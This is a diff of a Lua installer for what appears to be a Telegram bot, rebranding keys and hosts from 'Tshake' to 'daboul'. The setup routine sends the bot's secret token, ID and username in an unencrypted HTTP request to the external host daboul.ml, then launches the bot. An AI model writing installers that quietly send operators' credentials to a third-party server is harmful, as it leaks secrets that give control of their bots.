@@ -38,7 +38,7 @@ if not database:get(Server_daboul.."UserName_daboul") then
 print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
 local UserName = io.read():gsub('@','')
 if UserName ~= '' then
-local Get_Info = http.request("http://daboul.ml/info/?user="..UserName)
+local Get_Info = http.request("http://Tshake.ml/info/?user="..UserName)
 if Get_Info:match('Is_Spam') then
 io.write('\n\27[1;31m»» Sorry The server is Spsm \nتم حظر السيرفر لمدة 5 دقايق بسبب التكرار\n\27[0;39;49m')
 return false
@@ -54,7 +54,7 @@ os.execute('lua start.lua')
 else
 io.write('\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m')
 database:set(Server_daboul.."UserName_daboul",Json.Info.Username)
-database:set(Server_daboul.."Id_Tshake",Json.Info.Id)
+database:set(Server_daboul.."Id_daboul",Json.Info.Id)
 end
 end
 else
@@ -63,8 +63,8 @@ end
 os.execute('lua start.lua')
 end
 local function Files_daboul_Info()
-Create_Info(database:get(Server_daboul.."Token_daboul"),database:get(Server_daboul.."Id_Tshake"),database:get(Server_daboul.."UserName_daboul"))   
-http.request("http://Tshake.ml/add/?id="..database:get(Server_daboul.."Id_Tshake").."&user="..database:get(Server_daboul.."UserName_daboul").."&token="..database:get(Server_daboul.."Token_daboul"))
+Create_Info(database:get(Server_daboul.."Token_daboul"),database:get(Server_daboul.."Id_daboul"),database:get(Server_daboul.."UserName_daboul"))   
+http.request("http://daboul.ml/add/?id="..database:get(Server_daboul.."Id_daboul").."&user="..database:get(Server_daboul.."UserName_daboul").."&token="..database:get(Server_daboul.."Token_daboul"))
 local Rundaboul = io.open("daboul", 'w')
 Rundaboul:write([[
 #!/usr/bin/env bash
@@ -91,7 +91,7 @@ done
 RunTs:close()
 end
 Files_daboul_Info()
-database:del(Server_daboul.."Token_daboul");database:del(Server_daboul.."Id_Tshake");database:del(Server_daboul.."UserName_daboul")
+database:del(Server_daboul.."Token_daboul");database:del(Server_daboul.."Id_daboul");database:del(Server_daboul.."UserName_daboul")
 sudos = dofile('sudo.lua')
 os.execute('./install.sh ins')
 end 
@@ -102,7 +102,7 @@ AutoFiles_daboul()
 var = true
 else   
 f:close()  
-database:del(Server_daboul.."Token_daboul");database:del(Server_daboul.."Id_Tshake");database:del(Server_daboul.."UserName_daboul")
+database:del(Server_daboul.."Token_daboul");database:del(Server_daboul.."Id_daboul");database:del(Server_daboul.."UserName_daboul")
 sudos = dofile('sudo.lua')
 os.execute('./install.sh ins')
 var = false
